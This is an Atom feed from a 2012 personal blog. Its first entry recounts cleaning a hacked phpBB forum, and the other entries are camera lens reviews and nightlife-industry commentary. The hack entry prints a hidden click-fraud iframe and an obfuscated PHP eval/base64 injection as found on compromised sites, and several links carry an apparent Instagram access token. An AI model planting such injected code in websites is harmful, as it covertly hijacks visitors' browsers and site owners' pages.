<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[DV Digital]]></title>
  <link href="http://www.dan-vidal.com//atom.xml" rel="self"/>
  <link href="http://www.dan-vidal.com//"/>
  <updated>2012-09-28T01:08:42-04:00</updated>
  <id>http://www.dan-vidal.com//</id>
  <author>
    <name><![CDATA[Dan Vidal - Pod]]></name>
    <email><![CDATA[dan@dan-vidal.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
    <updated>2012-09-27T23:34:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>

<p>Every so often, websites are hacked. Sometimes it&#8217;s bad, sometimes it&#8217;s harmless. The usual goal is to infect a viewer&#8217;s computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of &#8220;harmless&#8221;, are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>

<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can&#8217;t trust them&#8230;</p>

<!-- more -->


<p>Why not?</p>

<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it&#8217;s cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don&#8217;t add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to &#8220;peer over the walls&#8221;, as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it&#8217;s hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>

<p>So, people invariably get in.</p>

<p>I first noticed something was amiss when I could not login to the forum&#8217;s administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser&#8217;s status bar. The redirects were pointing towards a site called &#8220;clickspro.org&#8221;. Now, since I helped build TNL, I know each and every aspect of it&#8217;s functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it&#8217;s been over three years since TNL has explicitly seen any new features.</p>

<p>So, I started a little investigating.</p>

<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>

<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn&#8217;t. I used the UNIX tool &#8220;cURL&#8221; to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure>


<p>This rendered the admin control panel for TNL in it&#8217;s raw HTML format. Therein, I spotted the offending code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe></span></code></pre></td></tr></table></div></figure>


<p>That does not belong.</p>

<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>

<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>

<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn&#8217;t find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>

<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>

<blockquote><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php 
</span><span class='line'>
</span><span class='line'>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI
</span><span class='line'>
</span><span class='line'>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf
</span><span class='line'>
</span><span class='line'>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387
</span><span class='line'>
</span><span class='line'>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt
</span><span class='line'>
</span><span class='line'>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2
</span><span class='line'>
</span><span class='line'>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX
</span><span class='line'>
</span><span class='line'>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs
</span><span class='line'>
</span><span class='line'>K/5DdO/p8AAAD//w==')));?></span></code></pre></td></tr></table></div></figure>


<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I&#8217;m not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don&#8217;t know what USENET is, Google it.</p>

<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>

<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>

<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>

<p>What mystifies me though, and I&#8217;m finally getting to the point of this rant, is that to implement this, it took some doing. This wasn&#8217;t a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>

<p>A lot of effort, for little return. Clicks, likes, and impressions. It&#8217;s all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it&#8217;s an ecommerce site, are people buying anything? If it&#8217;s a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>

<p>It&#8217;s sad that people actually pay for this sort of thing. It&#8217;s why my tactic with regards to web properties I don&#8217;t explicitly own or have control over is to get people off them as fast as possible. I&#8217;ll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don&#8217;t harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I&#8217;d rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I&#8217;m the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don&#8217;t play the stats game. I&#8217;ve opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>

<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn&#8217;t find it so, it&#8217;s really annoying.</p>

<p>Give me the real data and content.</p>

<p>And to the kid in Manila? Sorry about that. I know you&#8217;re just doing your job, and it&#8217;s better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>

<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More on the Canon 50 1.2 L]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l/"/>
    <updated>2012-09-27T11:53:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/27//' data-instagram-url='http://instagr.am/p/QEfxiVggDY/' class='instagram-image'><img src='http://distilleryimage0.s3.amazonaws.com/4c65b4c0087411e2bfbf22000a1e9be6_7.jpg' alt='Testing 50 1.2 L - insane. #bokeh #w210 #305 #brickell #designdistrict' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='289496019622822104_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>I took a little drive around last night to further test and experiment with my new Canon 50 1.2 L.</p>

<p>This time, it was more to test the shallow depth-of-field characteristics at <em>f1.2</em>. Again, at that aperture, your zone of acceptable focus is quite shallow.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7868.jpg" width="960" height="640" title="'E320 W210 50 1.2 L'" ></p>

<p>As you can see here, the hood ornament on my W210 is only partially in focus. The central part of the left spoke is sharp, with the left circular part of the ornament fading into a rather pleasant blur. And the distant background exhibits the smooth bokeh this lens is known for.</p>

<p>Now, this was shot handheld with autofocus engaged. So, this shot is technically a little &#8220;off&#8221;.</p>

<p>At such shallow depths-of-field, every movement counts. If you drift forwards or backwards even slightly, your zone of acceptable focus will change noticeably.</p>

<p>However, this is only noticeable to a great extent when one is doing closeup macro-style shots of objects. The tolerance is a little different at a longer range, as you can see here with this image I took of a <a href="http://miami.car2go.com/">Car2Go Miami</a> Smart Fortwo in Brickell.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7865.jpg" width="960" height="640" title="'Car2Go Miami 50 1.2 L'" ></p>

<p>Images like these, at a standoff range, can be done handheld, since the further away you are from your object, the less shallow your zone of critical focus becomes. You can do it handheld, that&#8217;s for sure. That being said, sometimes it&#8217;s not always practical to use a tripod. So, the best you can do in these situations is focus manually, and stay very still. Sounds simplistic, but in the case of street photography, you can&#8217;t really overproduce a shot, in my mind.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7879.jpg" width="960" height="640" title="'Street Graffiti Design District Miami 50 1.2 L'" ></p>

<p>The advantage of digital, of course, is that you can take as many images as you need, to get the desired image. This photo below, I initially did with autofocus. Of course, the results were a little off. However, when I manually focused, crouched down, and took three shots in succession, I landed the one I wanted. Not &#8220;spray-and-pray&#8221; but a small three-frame burst to insure I got what I wanted. Of course the ultimate insurance would have been using my tripod, but at 3 AM in Miami&#8217;s Design District, breaking out equipment at a grand scale isn&#8217;t advisable.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof_rev-7894.jpg" width="960" height="640" title="'W210 Design District Miami 50 1.2 L'" ></p>

<p>Not out of any sense of danger really, but more out of a sense of &#8220;It&#8217;s 3 in the morning and I don&#8217;t want to rig up a tripod for a test photo&#8230;&#8221;</p>

<p>So, in a nutshell, if you are going to shoot with this at it&#8217;s most shallow depth-of-field, I definitely recommend using a tripod, as well as focusing manually, if you are shooting your subject at close range. If you stand off a bit, it becomes less of a problem of course since your zone of acceptable focus becomes correspondingly wider.</p>

<p>But, with these characteristics in mind, the 50 1.2 L is definitely a worthwhile addition to any photographic arsenal. Everyone needs a solid 50mm prime lens, and this is the most solid one in it&#8217;s class on the market.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Some thoughts on the Canon 50 1.2 L lens.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/24/some-thoughts-on-the-canon-50-1-dot-2-l-lens/"/>
    <updated>2012-09-24T22:16:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/24/some-thoughts-on-the-canon-50-1-dot-2-l-lens</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/24//' data-instagram-url='http://instagr.am/p/P-xQvYggJh/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/e540a00406b411e28a2c22000a1d0378_7.jpg' alt='Action @clubspacemiami w @djlouispuig @sharam @jhartlein @rzo4423 @brittanyviolin @pluckster more at http://seenightlife.com/users/pod/albums/the-louis-puig-marathon' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.784715407,-80.193181247'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.784715407,-80.193181247&markers=25.784715407,-80.193181247&zoom=14&size=612x200&sensor=false' alt='Club Space' /></a><br/>Taken at Club Space</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='287884080866001505_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Well, today was a bit contentious. But in a good way. My prior commentary on the <a href="http://edmsnob.com/">EDM Snob</a> revealing himself generated a fair amount of buzz, and also some direct emails to me. Some agreed with me, some didn&#8217;t, but the magic was that they went through the trouble to email me and their replies were well-prepared and thought out. Even if you think I&#8217;m wrong, I always appreciate a well-crafted message. To quote my friend <a href="http://pingup.com/">Dade</a>, &#8220;It&#8217;s the nuances I appreciate&#8230;&#8221;</p>

<p>That being said, I&#8217;m sure my benign lens review will generate far less controversy and commentary. I spew forth about the de-anonymizing of some guy in the dance music scene and it&#8217;s game on. I post an educational piece and I get one reply.</p>

<p>Anyways, let&#8217;s be an agalmic cowboy and balance out the karma bank a bit.</p>

<p>I recently decided to live a little and invest in a 50 1.2 L prime lens from Canon. This is currently the fastest lens that Canon currently produces. With a maximum aperture of 1.2, this lens can practically &#8220;see in the dark&#8221;.</p>

<p>I&#8217;m not going to bore you guys with MTF charts and line pairs per mm comparisons. It&#8217;s been done. This lens has been around for about a decade now, and the scientific reviews have been done and done again. Instead, I&#8217;m going to speak about my personal experience with this lens thus far.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lpm-7530.jpg" width="640" height="960" title="'Jordyn 50 1.2 L'" ></p>

<p>I picked it up used from <a href="http://adorama.com/">Adorama</a> for a shade over $1200 US total. Adorama rated the condition as &#8220;E+&#8221; which basically means it was probably a floor demo or something to that effect. The date code has the construction of this specific copy of the lens of sometime in 2008. Now, according to most photo bloggers, the date code matters little, since typically high-priced pieces of glass sometimes can sit for years before they ship out to retailers, or in fact sit on the shelves of the retailers themselves for awhile. So, even though this copy is almost 5 years old, it arrived looking as fresh as the day Canon made it. Adorama of course inspected it and cleaned it, but you can still tell when a lens has been taken care of. Included was a front and rear cap, and even the lens hood, which is normally a separate item.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/09/21//' data-instagram-url='http://instagr.am/p/P2XI_QAgFP/' class='instagram-image'><img src='http://distilleryimage3.s3.amazonaws.com/02677ac4042411e2bea81231381a404b_7.jpg' alt='L.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/hefe'>Hefe</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='285517399124476239_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>The build quality is consistent with the other L-series lenses by Canon. Metal housing and mount, and a great deal of weight. This isn&#8217;t a light lens by any stretch. The main reason I bought this, other than the fast 1.2 maximum aperture, was the build. Shooting clubs and events can beat up your gear, so I don&#8217;t like to take chances.</p>

<p>Case in point, a few years ago, I owned the Canon EF-S 17-55 2.8 IS lens. A wonderful piece of glass in it&#8217;s own right, this was the &#8220;L&#8221; lens of the EF-S (crop body mount) lenses. However, it didn&#8217;t have the build quality of a true L lens, and after about a year, the IS mechanism failed on it. Rather than repair it, I sold it to <a href="http://keh.com">KEH</a> and got a credit towards my current ultrawide angle champ, the 16-35 2.8 L, which has served me faithfully for over six years now.</p>

<p>If you shoot in any sort of environment that could be considered &#8220;rough&#8221;, buy your glass accordingly. It might seem strange to pay $1200 for a fixed focal length lens, but the build quality will save you money in the long run.</p>

<p>However, all the build quality in the world matters not, if the lens itself does not perform.</p>

<p>And perform it does.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lpm-7442.jpg" width="960" height="640" title="'DJ Louis Puig of Space Miami 50 1.2 L'" ></p>

<p>The color rendition is amazing. Vivid, though accurate, with very little chromatic aberration, which can be fixed in post if it bothers you that much. The sharpness is unrivaled by any other 50mm prime I&#8217;ve tried, whether it be the Canon 50mm 1.4, or any number of third-party primes in that class. L glass is simply in a class of it&#8217;s own. At it&#8217;s max aperture of 1.2 your subject is decently sharp. The sweet spot for this piece of glass is from around 2.8 and up to f8 in my experience. This is simply a superb piece of prime glass.</p>

<p>However, shooting with it can be a personal challenge. Unlike it&#8217;s bulkier, more expensive cousin, the 85mm 1.2 L, the 50 1.2 L has a decent autofocus mechanism. Your AF will land all the time, every time, where you want it. This is dependent on your body though. The 5D MK II I use isn&#8217;t known for having the best autofocus, but I have my ST-E2 with it&#8217;s assist beam to help things along. I landed my AF almost every time. Now, with that being said, I was experimenting with shooting at the max aperture of 1.2 a lot of the time.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/roland-7199.jpg" width="960" height="640" title="'Roland at Gryphon 50 1.2 L'" ></p>

<p>Even at lesser ISOs than 6400, at 1.2 you are letting in a lot of light. Of course the tradeoff is that your depth of field is insanely shallow. Using a handy <a href="http://www.dofmaster.com/dofjs.html">depth-of-field</a> calculator, you can see that it is around <em>.07 feet</em> at the distance I took the above photo of Roland at. So, not much to work with. Some not used to this shallow DOF blame the lens. It&#8217;s not the lens, it&#8217;s you. It&#8217;s just real challenging to shoot at that shallow depth of field and land your shot properly. You will need to take multiple images and also, if possible, advise your subject to stay as still as possible. If they move, your composition can be thrown off as your specific focus point can move out of the acceptable area of focus.</p>

<p>Though it is the challenge that makes it fun. While you might have a lot of throwaways at first, after time you will get used to the unique qualities of this amazing lens. I haven&#8217;t used it consistently enough yet, but now that I own a copy, I know I will get better with it over time. I&#8217;ve already landed quite a few unique images because of this, and I know I will do more as I get acquainted with the properties of this lens. Having the capability to go that shallow with your depth of field can yield some amazing results, whether you are in a nightclub environment, or a controlled daytime situation.</p>

<p>Even with the challenges of shooting with it, I can definitely recommend this lens. You can save a lot of money by buying it&#8217;s cheaper cousin, the 50 1.4, however, the faster aperture and superb build quality of the 50 1.2 L will make up for the savings over the course of time. L glass is for a lifetime, and investing in it is definitely worth the effort.</p>

<p>Check out my <a href="http://seenightlife.com/users/pod/albums/the-louis-puig-marathon">last two</a> <a href="http://seenightlife.com/users/pod/albums/roland-returns-to-gryphon">galleries</a> over at <a href="http://seenightlife.com/">See Nightlife</a> for more example images using this lens under real-world, less-than-ideal conditions. I will definitely be posting more examples of what this lens can do as time goes on, including on how this is ideal for video.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Credit where credit is due.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/24/credit-where-credit-is-due/"/>
    <updated>2012-09-24T14:43:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/24/credit-where-credit-is-due</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/rs-6452.jpg" width="960" height="640" title="'Space Crowd Again'" ></p>

<p>For the past few months, a blog called <a href="http://edmsnob.com/">EDM Snob</a> was shaking up the dance music world. Written by an anonymous writer, the blog aired the controversies and the dirty laundry of the scam known as the modern dance music scene. It reminded me of TNL, but in blog form.</p>

<p>Today, the writer decided to reveal his real name and location.</p>

<!-- more -->


<p>Long suspected to be someone &#8216;in the know&#8217;, the EDM Snob turned out to be one Albert Berdellans, a graduate student living in Miami, with no formal industry involvement whatsoever.</p>

<p>Albert decided to reveal himself after he found out that people suspected of being him were getting into trouble with their employers, up to the point of losing their jobs, even. That took a lot of courage on his part. Well done, Albert. However, it does reveal a few sad facts, some of which Albert noted in his farewell post. The first one, in my mind, is the most telling:</p>

<blockquote><p>Up until this point, EDM media had been full of what a fellow writer in an email exchange called “breathless boosterism.” In other words, people were only writing positive things about EDM. That’s great, but nothing in this world is perfect. You have to tell the whole story.</p><footer><strong>Albert Berdellans</strong> <cite><a href='http://edmsnob.com/the-end-of-edmsnob/'>The End of EDM Snob</a></cite></footer></blockquote>


<p>This is reminiscent of my post from a week or so ago, <a href="http://www.dan-vidal.com/blog/2012/09/10/the-free-flow-of-opinion/">The Free Flow Of Opinion</a>. He saw the need for the real story to get out, and provided a channel for it. And yes, the modern commercial dance music world is wholly dependent on advertorial. When your entire premise is making overpaid stars out of guys who play back prerecorded sounds in a set pattern, it&#8217;s easy for anyone with a modicum of knowledge to see that it&#8217;s a complete scam.</p>

<p>The sad part comes in on how the dance music world reacted to these stories getting out. In their quest to keep the public from seeing the old man behind the curtain, the industry started making examples out of people suspected to be the EDM Snob, or at least feeding him information. As Albert pointed out:</p>

<blockquote><p>here have been times over the last few months where people within the industry have been accused of being me. Sometimes there has even been circumstantial evidence that connects them with something I wrote. In some cases, this has cost people their jobs or seriously damaged their careers. I simply cannot continue to stand by and allow other people to be blamed and suffer for the things I write. No one deserves that.</p><footer><strong>Albert Berdellans</strong> <cite><a href='http://edmsnob.com/the-end-of-edmsnob/'>The End of EDM Snob</a></cite></footer></blockquote>


<p>Frankly, that&#8217;s really what stuck with me. The bits and pieces he was revealing, while somewhat controversial, weren&#8217;t really that damaging. DJs are still getting booked for $100,000 performances. Clubs still fill up on any given night of the week. However, greed and ego overruled everyone&#8217;s good sense and led to a disappointing backlash from the industry.</p>

<p>Furthermore, this story has led me to wonder about the free flow of information. Is it possible, not just in dance music, but in the world in general, to run a media source dedicated to exposing what really goes on in a given area, without compromising journalistic ethics, or being forced to shut down? The dance music industry couldn&#8217;t figure out whom Albert was, so they started chopping the heads of suspected informants, hoping to ferret out his identity. I would do the same, since yes, no one deserves that. Especially over something petty like tour schedules and the backstage riders of guys pressing play on CD decks.</p>

<p>Though, at a practical level, it&#8217;s just dance music and nightlife. The world will move on with or without the Snob. However, it does reinforce my faith in the self-sustaining nature of the forum concept. At TNL we don&#8217;t out the personal details of members unless they want us to. And, I think we&#8217;ve managed to hammer home with the venues, DJs, and agents that it is user-driven, so going after us is pointless. I learned this lesson in the CJ days oddly enough. This was just after our acquisition, and prior to the days when Track decided to turn the site into pure advertorial. What the circumstances were was that the notorious (now thankfully defunct) venue, Nocturnal, in Downtown Miami, had the first of many run-ins with unpaid creditors and was subject to a law enforcement-backed collection action, which basically means that the repo men roll up with a cop in tow to do their collections work. So, on the night of the collection action, an anonymous source had sent a forum user some grainy cellphone photos of the trucks and police cruiser in front of the venue. I was home at the moment so I posted a story on the front page, in the sense that it was a breaking news item, and also as an experiment in &#8220;realtime&#8221; blogging (this was 2006&#8230;) through our then-new Movable Type blog engine. The story made the rounds over the weekend, until Monday, when I received a threatening call from an attorney whom represented Nocturnal. A little spooked, I pulled the story. A few minutes later, Nick called me on the carpet, not to ask why I had posted it, but why I had taken it down. The essence was that since it was a news item, and it took place in public (the trucks were on a public street and since PD was involved it was public record), it could stay, and the club didn&#8217;t have a legal leg to stand on. The club played on my then-ignorance of the law, and I pulled the article. Of course, within a few minutes, I reposted it, and ignored all subsequent phone calls from the attorney. It never went further than that, but if it had, any judge would have thrown out the case before it reached trial.</p>

<p>The moral of that tale is that a knowledge of the law is your best friend as a blogger and/or a journalist. While I understand why Albert decided to cease publication of his blog, had he chosen to take it further, he could have had an airtight legal defense, backed in part by the US Constitution. However, it&#8217;s hard to take this tactic when people&#8217;s livelihoods and lives are at stake. The dance music community is very tight, and if you lose a gig under bad circumstances in one firm, there is a very real possibility of being blacklisted throughout the industry.</p>

<p>The industry definitely did not fight fair with Albert on this one. They knew they had no legal recourse against him, so they went for the underhanded tactic of sacrificing people&#8217;s careers, to force him to have an attack of conscience and cease publication. Again, I would have done the same. I applaud Albert though for stating this. By doing so, he went out with a bang, and gave the modern dance music industry a much-deserved punch in the mouth. I guess if you are going to go, go with style. Cheers to that, Albert. By the way, you are more than welcome to post on <a href="http://talknightlife.com/">TNL</a>.</p>

<blockquote><p>&#8220;The music business is a cruel and shallow money trench, a long plastic hallway where thieves and pimps run free, and good men die like dogs. There&#8217;s also a negative side.&#8221;</p><footer><strong>Mistakenly attributed to Hunter S Thompson</strong> <cite><a href='http://urbanlegends.about.com/od/dubiousquotes/a/hunter_thompson.htm'>HST Misquote</a></cite></footer></blockquote>


<p>HST really didn&#8217;t say that, but I think it applies to today&#8217;s dance music industry. It&#8217;s sad.</p>

<p>I think I&#8217;ll put on some old vinyl tonight, and remember when it was just about playing good music and having a great night out.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How I handle noise in a photo.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/20/how-i-handle-noise-in-a-photo/"/>
    <updated>2012-09-20T02:09:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/20/how-i-handle-noise-in-a-photo</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/rs-6346.jpg" width="960" height="640" title="'Space Crowd'" ></p>

<p>OK, like I said I&#8217;ll try and pass on some know-how from time to time on here. I can document what I do, but it&#8217;s up to any of you guys who use it to know when and where to use it.</p>

<p>But I&#8217;m not going to turn this into a lecture series or motivational speaker session. The world has enough of those.</p>

<p>Anyways, the biggest question I get is, <em>&#8220;How the hell do you shoot at a high ISO and manage the noise?&#8221;</em></p>

<p>Well, fact is, I don&#8217;t manage it really&#8230;</p>

<!-- more -->


<p>Hmm, well, maybe I do sometimes.</p>

<p>Fact is, we&#8217;ve come a long way in terms of noise in digital imaging systems, and prior to that, the grain present in analog processes involving film. And even when there was noise and grain present, it was largely left alone or used as part of the composition as a whole. The important part was capturing the moment, and the noise was disregarded in favor of the subject as a whole. Which is what I tend to do. ISO 6400 isn&#8217;t really that bad. It&#8217;s actually less noisy/grainy than the ISO 400 film stock I &#8220;grew up&#8221; on.</p>

<p>But, when I do want to deal with or minimize the noise, I don&#8217;t employ conventional noise reduction techniques as it were. Plugins are generally all over the place and time-consuming, and the built-in NR functions of popular imaging applications tends to make the end images too soft.</p>

